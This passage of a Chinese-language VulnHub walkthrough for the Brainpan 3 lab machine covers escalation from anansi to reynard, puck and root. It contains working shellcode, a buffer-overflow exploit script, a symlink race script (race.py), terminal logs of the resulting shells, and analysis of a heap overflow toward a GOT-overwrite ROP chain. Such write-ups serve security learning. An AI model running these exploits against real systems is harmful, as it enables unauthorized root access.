<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import struct</span><br><span class="line"></span><br><span class="line">def p(v):</span><br><span class="line">    <span class="built_in">return</span> struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, v)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&#x27;</span></span><br><span class="line">__bss_key = 0x0804a080</span><br><span class="line">argFile = 29 * p(__bss_key)</span><br><span class="line">argKey = shellcode</span><br><span class="line"><span class="built_in">print</span> argFile + <span class="string">&#x27; &#x27;</span> + argKey</span><br></pre></td></tr></table></figure>

<p>执行漏洞利用程序时，它并不总是生效，只需多执行几次，直到它生效为止</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3<span class="comment"># ./cryptor $(python cryptthis.py)</span></span><br><span class="line">[+] saving to �����������������������������.enc</span><br><span class="line">段错误</span><br><span class="line">root@kali:~/vulnhub/brainpan3<span class="comment"># ./cryptor $(python cryptthis.py)</span></span><br><span class="line">[+] saving to �����������������������������.enc</span><br><span class="line">段错误</span><br><span class="line">root@kali:~/vulnhub/brainpan3<span class="comment"># ./cryptor $(python cryptthis.py)</span></span><br><span class="line">[+] saving to �����������������������������.enc</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># pwd</span></span><br><span class="line">/root/vulnhub/brainpan3</span><br><span class="line"><span class="comment"># uname -a</span></span><br><span class="line">Linux kali 5.4.0-kali2-amd64 <span class="comment">#1 SMP Debian 5.4.8-1kali1 (2020-01-06) x86_64 GNU/Linux</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">bofh  cryptor  cryptthis.py  poc.py  report  report.py  shell  test.py</span><br></pre></td></tr></table></figure>

<p>放在brainpan3上面运行poc</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan3:/tmp$ <span class="built_in">echo</span> <span class="string">&quot;import struct</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def p(v):</span></span><br><span class="line"><span class="string">    return struct.pack(&#x27;&lt;L&#x27;, v)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">shellcode = &#x27;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&#x27;</span></span><br><span class="line"><span class="string">__bss_key = 0x0804a080</span></span><br><span class="line"><span class="string">argFile = 29 * p(__bss_key)</span></span><br><span class="line"><span class="string">argKey = shellcode</span></span><br><span class="line"><span class="string">print argFile + &#x27; &#x27; + argKeyecho &quot;</span>import struct</span><br><span class="line">&gt; </span><br><span class="line">&gt; def p(v):</span><br><span class="line">&gt;     <span class="built_in">return</span> struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, v)</span><br><span class="line">&gt; </span><br><span class="line">&lt;\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80<span class="string">&#x27;   </span></span><br><span class="line"><span class="string">&gt; __bss_key = 0x0804a080</span></span><br><span class="line"><span class="string">&gt; argFile = 29 * p(__bss_key)</span></span><br><span class="line"><span class="string">&gt; argKey = shellcode</span></span><br><span class="line"><span class="string">&gt; &quot; &gt; cryptthis.py</span></span><br><span class="line"><span class="string">print argFile + &#x27;</span> <span class="string">&#x27; + argKey&quot; &gt; cryptthis.py</span></span><br><span class="line"><span class="string">anansi@brainpan3:/tmp$ ls</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">cryptthis.py  vjGSL5d  vtSHi56</span></span><br><span class="line"><span class="string">anansi@brainpan3:/tmp$ cat cryptthis.py</span></span><br><span class="line"><span class="string">cat cryptthis.py</span></span><br><span class="line"><span class="string">import struct</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def p(v):</span></span><br><span class="line"><span class="string">    return struct.pack(&#x27;</span>&lt;L<span class="string">&#x27;, v)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">shellcode = &#x27;</span>\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80<span class="string">&#x27;</span></span><br><span class="line"><span class="string">__bss_key = 0x0804a080</span></span><br><span class="line"><span class="string">argFile = 29 * p(__bss_key)</span></span><br><span class="line"><span class="string">argKey = shellcode</span></span><br><span class="line"><span class="string">print argFile + &#x27;</span> <span class="string">&#x27; + argKey</span></span><br><span class="line"><span class="string">anansi@brainpan3:/tmp$ python cryptthis.py</span></span><br><span class="line"><span class="string">python cryptthis.py</span></span><br><span class="line"><span class="string">����������������������������� 1����</span></span><br><span class="line"><span class="string">                                   Qh//shh/bin��</span></span><br><span class="line"><span class="string">anansi@brainpan3:/tmp$ cd /home</span></span><br><span class="line"><span class="string">cd /home</span></span><br><span class="line"><span class="string">anansi@brainpan3:/home$ ls</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">anansi  puck  reynard</span></span><br><span class="line"><span class="string">anansi@brainpan3:/home$ cd renard</span></span><br><span class="line"><span class="string">cd renard</span></span><br><span class="line"><span class="string">bash: cd: renard: No such file or directory</span></span><br><span class="line"><span class="string">anansi@brainpan3:/home$ cd reynard</span></span><br><span class="line"><span class="string">cd reynard</span></span><br><span class="line"><span class="string">anansi@brainpan3:/home/reynard$ ls</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">private</span></span><br><span class="line"><span class="string">anansi@brainpan3:/home/reynard$ cd private</span></span><br><span class="line"><span class="string">cd private</span></span><br><span class="line"><span class="string">anansi@brainpan3:/home/reynard/private$ ls</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">cryptor  sekret.txt.enc</span></span><br><span class="line"><span class="string">anansi@brainpan3:/home/reynard/private$ ./cryptor $(python /tmp/cryptthis.py)</span></span><br><span class="line"><span class="string">./cryptor $(python /tmp/cryptthis.py)</span></span><br><span class="line"><span class="string">[+] saving to �����������������������������.enc</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">id</span></span><br><span class="line"><span class="string">uid=1000(anansi) gid=1003(webdev) euid=1002(reynard) groups=1002(reynard)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">whoami</span></span><br><span class="line"><span class="string">reynard</span></span><br></pre></td></tr></table></figure>

<p>现在得到了reynard用户的权限</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub204.jpg"></p>
<h3 id="Puck"><a href="#Puck" class="headerlink" title="Puck"></a>Puck</h3><p>我花了点时间弄清楚如何升级到puck用户的权限，当执行netstat时，注意到端口7075上有一个本地列出的服务，当连接到它时，出现以下文本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nc 127.0.0.1 7075</span><br><span class="line">nc 127.0.0.1 7075</span><br><span class="line">Incorrect key</span><br></pre></td></tr></table></figure>

<p>经过更多搜索之后，在/usr/local/sbin文件夹中找到了与此服务相关的trixd可执行文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /usr/<span class="built_in">local</span>/sbin/</span><br><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/sbin/</span><br><span class="line">$ ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">total 40K</span><br><span class="line">drwxr-xr-x  2 root root 4.0K May 26  2015 .</span><br><span class="line">drwxr-xr-x 10 root root 4.0K May 19  2015 ..</span><br><span class="line">-rwxr-xr-x  1 root root  17K May 26  2015 brainpan3</span><br><span class="line">-rwxr-xr-x  1 root root 7.5K May 20  2015 trixd</span><br><span class="line">-rwxr-xr-x  1 root root  343 May 21  2015 www</span><br></pre></td></tr></table></figure>

<p>将文件复制到本地计算机以进行分析</p>
<p>main</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int __cdecl main()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // eax</span><br><span class="line">  int v1; // eax</span><br><span class="line">  int v2; // ebx</span><br><span class="line">  int v4; // ST1C_4</span><br><span class="line">  int v5; // ST1C_4</span><br><span class="line">  struct timeval timeout; // [esp+24h] [ebp-94h]</span><br><span class="line">  struct <span class="built_in">stat</span> stat_buf; // [esp+2Ch] [ebp-8Ch]</span><br><span class="line">  int buf; // [esp+84h] [ebp-34h]</span><br><span class="line">  int v9; // [esp+88h] [ebp-30h]</span><br><span class="line">  int v10; // [esp+8Ch] [ebp-2Ch]</span><br><span class="line">  int v11; // [esp+90h] [ebp-28h]</span><br><span class="line">  int v12; // [esp+94h] [ebp-24h]</span><br><span class="line">  int s1; // [esp+98h] [ebp-20h]</span><br><span class="line">  int v14; // [esp+9Ch] [ebp-1Ch]</span><br><span class="line">  int v15; // [esp+A0h] [ebp-18h]</span><br><span class="line">  int v16; // [esp+A4h] [ebp-14h]</span><br><span class="line">  int v17; // [esp+A8h] [ebp-10h]</span><br><span class="line">  unsigned int v18; // [esp+ACh] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v18 = __readgsdword(0x14u);</span><br><span class="line">  <span class="keyword">if</span> ( ptrace(0, 0, 1, 0) &lt; 0 )</span><br><span class="line">    <span class="built_in">return</span> -1;</span><br><span class="line">  setbuf(stdout, 0);</span><br><span class="line">  timeout.tv_usec = 1;</span><br><span class="line">  buf = 0;</span><br><span class="line">  v9 = 0;</span><br><span class="line">  v10 = 0;</span><br><span class="line">  v11 = 0;</span><br><span class="line">  v12 = 0;</span><br><span class="line">  s1 = 0;</span><br><span class="line">  v14 = 0;</span><br><span class="line">  v15 = 0;</span><br><span class="line">  v16 = 0;</span><br><span class="line">  v17 = 0;</span><br><span class="line">  __lxstat(3, <span class="string">&quot;/mnt/usb/key.txt&quot;</span>, &amp;stat_buf);</span><br><span class="line">  <span class="keyword">if</span> ( (stat_buf.st_mode &amp; 0xF000) == 40960 )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = -1;</span><br><span class="line">    puts(<span class="string">&quot;Key file is compromised.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    select(1, 0, 0, 0, &amp;timeout);</span><br><span class="line">    v0 = open(<span class="string">&quot;/home/puck/key.txt&quot;</span>, 0);</span><br><span class="line">    <span class="keyword">if</span> ( v0 &lt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = v0;</span><br><span class="line">      perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">      v0 = v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">read</span>(v0, &amp;buf, 0x13u);</span><br><span class="line">    v1 = open(<span class="string">&quot;/mnt/usb/key.txt&quot;</span>, 0);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = v1;</span><br><span class="line">      perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">      v1 = v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">read</span>(v1, &amp;s1, 0x13u);</span><br><span class="line">    v2 = strcmp((const char *)&amp;s1, (const char *)&amp;buf);</span><br><span class="line">    <span class="keyword">if</span> ( v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = 0;</span><br><span class="line">      puts(<span class="string">&quot;Incorrect key&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      puts(<span class="string">&quot;Authentication successful&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Reynard可以写入“/mnt/usb/”文件夹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">131707    4 drwxrwx---   2 reynard  dev          4096 Aug  2 15:54 /mnt/usb</span><br></pre></td></tr></table></figure>

<p>一旦在7075上连接到服务，就会执行checkKeyfile函数，该函数打开2个密钥文件并比较它们的内容，如果它们匹配，则将其放入shell中。符号链接检查和睡眠（使用select）使Superkojiman暗示了比赛状况。可以在usb文件夹中重复创建一个密钥文件，然后将其更改为指向puck文件夹中的密钥文件的符号链接，同时连接到该服务，并希望在某个时候能克服符号链接检查和打开文件。将欺骗比较两个相同文件的代码，即pucks文件夹中的有效密钥。</p>
<h2 id="走向胜利"><a href="#走向胜利" class="headerlink" title="走向胜利"></a>走向胜利</h2><p>编写了一段python代码，该代码重复创建了一个密钥文件，将其更改为符号链接，并且每次操作之间几乎没有睡眠。该脚本必须作为reynard运行，因为他是唯一允许写入usb文件夹的脚本。任何其他用户都可以连接到该服务。</p>
<p>race.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import time</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> os.geteuid() != 1002:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Run as user reynard&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(1000)</span><br><span class="line">        os.system(<span class="string">&#x27;echo &quot;h4xh4xh4xh4xh4xh4x&quot; &gt; /mnt/usb/key.txt&#x27;</span>)</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        os.unlink(<span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>)</span><br><span class="line">        os.symlink(<span class="string">&#x27;/home/puck/key.txt&#x27;</span>, <span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>)</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        os.unlink(<span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] Finished&#x27;</span></span><br></pre></td></tr></table></figure>

<p>为了使其正常工作，需要2个shell，因此使用了报告漏洞利用创建了另一个anansi shell。当reynard shell执行race脚本时，此anansi shell用于连接到服务。race脚本。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python race.py</span><br><span class="line">python race.py</span><br></pre></td></tr></table></figure>

<p>在第二个终端中运行几次netcat循环，直到成功。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan3:/$ <span class="keyword">for</span> i <span class="keyword">in</span> &#123;0..100&#125;;<span class="keyword">do</span> nc 127.0.0.1 7075;sleep 0.1; <span class="keyword">done</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;0..100&#125;;<span class="keyword">do</span> nc 127.0.0.1 7075;sleep 0.1; <span class="keyword">done</span></span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Authentication successful</span><br><span class="line">id</span><br><span class="line">id</span><br><span class="line">uid=1001(puck) gid=1004(dev) groups=1001(puck)</span><br><span class="line">whoami</span><br><span class="line">whoami</span><br><span class="line">puck</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/</span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line">ls</span><br><span class="line">ls</span><br><span class="line">anansi</span><br><span class="line">puck</span><br><span class="line">reynard</span><br><span class="line"><span class="built_in">cd</span> puck</span><br><span class="line"><span class="built_in">cd</span> puck</span><br><span class="line">ls</span><br><span class="line">ls</span><br><span class="line">key.txt</span><br><span class="line">cat key.txt</span><br><span class="line">cat key.txt</span><br><span class="line">HBN48HY71ERG5GA6290V</span><br><span class="line">ls</span><br><span class="line">ls</span><br><span class="line">key.txt</span><br><span class="line">ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 24</span><br><span class="line">drwx------ 2 puck puck 4096 Jun 10  2015 .</span><br><span class="line">drwxr-xr-x 5 root root 4096 May 19  2015 ..</span><br><span class="line">-rw------- 1 puck puck    0 Jun 10  2015 .bash_history</span><br><span class="line">-rw-r--r-- 1 puck puck  220 May 19  2015 .bash_logout</span><br><span class="line">-rw-r--r-- 1 puck puck 3637 May 19  2015 .bashrc</span><br><span class="line">-rw-r--r-- 1 puck puck  675 May 19  2015 .profile</span><br><span class="line">-rw------- 1 puck puck   21 May 19  2015 key.txt</span><br></pre></td></tr></table></figure>

<h2 id="没有得到root权限，就没有荣耀"><a href="#没有得到root权限，就没有荣耀" class="headerlink" title="没有得到root权限，就没有荣耀"></a>没有得到root权限，就没有荣耀</h2><p>当搜索有关puck的文件时，已经找到了一个有趣的cron job</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan3:/home/puck$ ls -lah /etc/cron.d/</span><br><span class="line">ls -lah /etc/cron.d/</span><br><span class="line">ls -lah /etc/cron.d/</span><br><span class="line">total 16K</span><br><span class="line">drwxr-xr-x  2 root root 4.0K May 20  2015 .</span><br><span class="line">drwxr-xr-x 90 root root 4.0K Feb  6 07:11 ..</span><br><span class="line">-rw-r--r--  1 root root  102 Feb  9  2013 .placeholder</span><br><span class="line">-rw-r--r--  1 root root  100 May 19  2015 msg_admin</span><br><span class="line">puck@brainpan3:/home/puck$ cat /etc/cron.d/msg_admin</span><br><span class="line">cat /etc/cron.d/msg_admin</span><br><span class="line">cat /etc/cron.d/msg_admin</span><br><span class="line">* * * * * root <span class="built_in">cd</span> /opt/.messenger; <span class="keyword">for</span> i <span class="keyword">in</span> *.msg; <span class="keyword">do</span> /usr/<span class="built_in">local</span>/bin/msg_admin 1 <span class="variable">$i</span>; rm -f <span class="variable">$i</span>; <span class="keyword">done</span></span><br><span class="line">puck@brainpan3:/home/puck$ /usr/<span class="built_in">local</span>/bin/msg_admin</span><br><span class="line">/usr/<span class="built_in">local</span>/bin/msg_admin</span><br><span class="line">/usr/<span class="built_in">local</span>/bin/msg_admin</span><br><span class="line">Usage: /usr/<span class="built_in">local</span>/bin/msg_admin priority message.txt</span><br><span class="line">Message file format: requestername|message</span><br><span class="line">Eg: tony|Add a new user to repo</span><br><span class="line">Can have multiple messages <span class="keyword">in</span> a single file separated by newlines.</span><br><span class="line">Eg: tony|Please remove /tmp/foo</span><br><span class="line">    cate|Reset password request.</span><br></pre></td></tr></table></figure>

<p>cron job 从/opt/.messenger文件夹中获取所有.msg文件，并将它们传递给msg_admin可执行文件，然后删除该文件。将可执行文件复制到本地计算机进行分析。</p>
<p>struct_msg</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">struct struct_msg</span><br><span class="line">&#123;</span><br><span class="line">  int Priority;</span><br><span class="line">  char *Requestername;</span><br><span class="line">  char *Msg;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>main</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  void *v3; // esp</span><br><span class="line">  int result; // eax</span><br><span class="line">  int v5; // ebx</span><br><span class="line">  int v6; // ebx</span><br><span class="line">  char *v7; // ebx</span><br><span class="line">  const char *v8; // [esp-18h] [ebp-98h]</span><br><span class="line">  int v9; // [esp-14h] [ebp-94h]</span><br><span class="line">  int v10; // [esp-Ch] [ebp-8Ch]</span><br><span class="line">  const char **v11; // [esp+0h] [ebp-80h]</span><br><span class="line">  int v12; // [esp+4h] [ebp-7Ch]</span><br><span class="line">  char *s; // [esp+Ch] [ebp-74h]</span><br><span class="line">  int v14; // [esp+10h] [ebp-70h]</span><br><span class="line">  int i; // [esp+14h] [ebp-6Ch]</span><br><span class="line">  int v16; // [esp+18h] [ebp-68h]</span><br><span class="line">  int v17; // [esp+1Ch] [ebp-64h]</span><br><span class="line">  int v18; // [esp+20h] [ebp-60h]</span><br><span class="line">  char *dest; // [esp+24h] [ebp-5Ch]</span><br><span class="line">  FILE *stream; // [esp+28h] [ebp-58h]</span><br><span class="line">  void *v21; // [esp+2Ch] [ebp-54h]</span><br><span class="line">  void *v22; // [esp+30h] [ebp-50h]</span><br><span class="line">  char *delim; // [esp+34h] [ebp-4Ch]</span><br><span class="line">  char *src; // [esp+38h] [ebp-48h]</span><br><span class="line">  int v25[10]; // [esp+3Ch] [ebp-44h]</span><br><span class="line">  unsigned int v26; // [esp+64h] [ebp-1Ch]</span><br><span class="line">  int *v27; // [esp+70h] [ebp-10h]</span><br><span class="line"></span><br><span class="line">  v27 = &amp;argc;</span><br><span class="line">  v12 = argc;</span><br><span class="line">  v11 = argv;</span><br><span class="line">  v26 = __readgsdword(0x14u);</span><br><span class="line">  v16 = 0;</span><br><span class="line">  v17 = 10;</span><br><span class="line">  v14 = 0;</span><br><span class="line">  i = 0;</span><br><span class="line">  v18 = 399;</span><br><span class="line">  v3 = alloca(400);</span><br><span class="line">  dest = (char *)&amp;v10;</span><br><span class="line">  <span class="keyword">if</span> ( argc &gt; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = v11[1];</span><br><span class="line">    v16 = atol(v8);</span><br><span class="line">    stream = fopen(v11[2], <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    s = (char *)malloc(0x190u);</span><br><span class="line">    v21 = malloc(0x14u);</span><br><span class="line">    v22 = malloc(0x64u);</span><br><span class="line">    <span class="keyword">while</span> ( getline((int)&amp;s, (int)&amp;LINEMAX_2, (int)stream) &gt; 0 )</span><br><span class="line">      ++v14;</span><br><span class="line">    v9 = v14;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Recording %d entries\n&quot;</span>, v14);</span><br><span class="line">    rewind(stream);</span><br><span class="line">    <span class="keyword">for</span> ( i = 0; i &lt; v14; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v25[i] = (int)malloc(0xCu);</span><br><span class="line">      *(_DWORD *)v25[i] = v16;</span><br><span class="line">      v5 = v25[i];</span><br><span class="line">      *(_DWORD *)(v5 + 4) = malloc(0xAu);</span><br><span class="line">      v6 = v25[i];</span><br><span class="line">      *(_DWORD *)(v6 + 8) = malloc(0xC8u);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = 0; i &lt; v14; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      delim = <span class="string">&quot;|&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span> ( getline((int)&amp;s, (int)&amp;LINEMAX_2, (int)stream) &gt; 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = s;</span><br><span class="line">        v7[strlen(s) - 1] = 0;</span><br><span class="line">        src = strtok(s, delim);</span><br><span class="line">        strcpy(*(char **)(v25[i] + 4), src);</span><br><span class="line">        src = strtok(0, delim);</span><br><span class="line">        strcpy(*(char **)(v25[i] + 8), src);</span><br><span class="line">        strncpy(dest, *(const char **)(v25[i] + 8), 0x64u);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(stream);</span><br><span class="line">    notify_admin((int)v25, v14);</span><br><span class="line">    result = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    usage((int)*v11);</span><br><span class="line">    result = 1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是经典的内存损坏。对于.msg文件中的每条消息（行），它都会创建一个struct_msg结构并为其变量分配内存，然后将其添加到列表中。接下来，它循环遍历文件，并在“ |”定界符上分割每一行，并将每个部分复制到结构变量“Requestername”和“Msg”。这些变量的固定大小为10（请求者名称）和200（消息）。由于没有检查长度，因此可能破坏内存中的结构指针。以下代码创建一个包含2条消息的.msg文件，每个文件的变量都填充到其最大值，因此不会破坏任何内容。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line"> </span><br><span class="line"><span class="comment"># message 1</span></span><br><span class="line">payload =  10  * <span class="string">&#x27;\x41&#x27;</span> <span class="comment"># A</span></span><br><span class="line">payload += <span class="string">&#x27;|&#x27;</span></span><br><span class="line">payload += 200 * <span class="string">&#x27;\x42&#x27;</span> <span class="comment"># B</span></span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"><span class="comment"># message 2</span></span><br><span class="line">payload += 10  * <span class="string">&#x27;\x43&#x27;</span> <span class="comment"># C</span></span><br><span class="line">payload += <span class="string">&#x27;|&#x27;</span></span><br><span class="line">payload += 200 * <span class="string">&#x27;\x44&#x27;</span> <span class="comment"># D</span></span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"> </span><br><span class="line">open(<span class="string">&#x27;poc.msg&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(payload)</span><br></pre></td></tr></table></figure>

<p>当使用GDB分析内存时，可以看到如何映射所有内存</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x804c388:    0x00000001    0x0804c398    0x0804c3a8    0x00000011</span><br><span class="line">0x804c398:    0x41414141    0x41414141    0x00004141    0x000000d1</span><br><span class="line">0x804c3a8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3b8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3c8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3d8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3e8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3f8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c408:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c418:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c428:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c438:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c448:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c458:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c468:    0x42424242    0x42424242    0x00000000    0x00000011</span><br><span class="line">0x804c478:    0x00000001    0x0804c488    0x0804c498    0x00000011</span><br><span class="line">0x804c488:    0x43434343    0x43434343    0x00004343    0x000000d1</span><br><span class="line">0x804c498:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c4a8:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c4b8:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c4c8:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c4d8:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c4e8:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c4f8:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c508:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c518:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c528:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c538:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c548:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c558:    0x44444444    0x44444444    0x00000000    0x00020aa1</span><br></pre></td></tr></table></figure>

<p>第一个struct_msg结构位于0x804c388，第二个位于0x804c478。现在，在第一个消息中使用较大的（216字节）“Msg”缓冲区时，将覆盖第二个struct_msg结构的“Requestername”指针，并在下一个strcpy调用中有效控制目标指针和源数据，从而导致Write-允许我们修补GOT条目的任何条件。这段代码将got.strtok地址修补为0x43434343，strtok是strcpy之后执行的下一个函数。我编写了一个ROP有效负载，它通过从3个阶段中添加0xE900来将取自atol的atol的地址加载到eax中，并将该值累加至系统，然后使用参数’/ tmp / foo’调用eax（system），这是一个脚本由我们创建并在执行时将根拥有的SUID shell复制到tmp。</p>
